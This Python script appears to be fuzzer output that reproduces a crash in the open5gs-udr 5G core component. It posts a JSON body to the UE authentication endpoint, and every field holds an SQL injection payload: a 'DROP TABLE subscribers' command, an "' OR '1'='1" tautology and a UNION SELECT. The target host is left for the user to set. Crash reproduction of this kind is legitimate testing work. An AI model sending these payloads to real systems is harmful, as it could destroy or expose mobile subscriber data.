#!/usr/bin/env python3
# Crash reproduction for open5gs-udr (low)
# Detected: Sat May  9 03:50:30 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'POST'
path = '/nausf-auth/v1/ue-authentications'
body = b'{"supiOrSuci": "\'; DROP TABLE subscribers; --", "servingNetworkName": "\' OR \'1\'=\'1", "authType": "1\' UNION SELECT * FROM users--"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
